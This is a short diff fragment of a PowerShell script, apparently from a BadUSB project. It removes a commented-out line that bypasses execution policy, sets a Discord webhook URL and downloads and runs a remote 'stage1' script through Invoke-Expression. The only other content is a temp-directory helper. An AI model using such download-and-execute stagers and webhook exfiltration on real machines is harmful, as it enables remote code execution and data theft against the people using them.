@@ -1,5 +1,3 @@
-#powershell -ExecutionPolicy Bypass -Command "$DiscordUrl = 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage1_t3st.ps1'))"
-
 # Function to handle the temporary directory
 function TempDir {
     # Check if the C:\temp directory exists
